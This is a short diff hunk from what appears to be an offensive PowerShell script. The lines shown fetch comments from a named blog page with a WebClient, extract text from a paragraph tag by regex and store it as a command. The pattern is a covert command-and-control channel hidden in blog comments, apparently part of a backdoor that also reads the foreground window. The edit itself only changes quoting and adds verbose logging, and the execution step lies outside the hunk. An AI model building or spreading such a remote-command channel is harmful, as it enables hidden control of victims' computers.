@@ -833,9 +833,11 @@ public static extern IntPtr GetForegroundWindow();
                 }
             
             
-            
-            $testo = 'http://networksecuritytester.blogspot.it/2015/03/corso-cyberwar.html?showComment'
+             
+            $testo = "http://networksecuritytester.blogspot.it/2015/03/corso-cyberwar.html?showComment"
+            Write-Verbose $testo
             $CommentResult = $WebClientObject.DownloadString($testo)
+            Write-Verbose $CommentResult
             [string]$Commentstring = [regex]::matches( $CommentResult,  '(?i)<p[^>]*>(.*)</p>' )
             $command_g = $Commentstring.split('>')
             $command = $command_g[1]
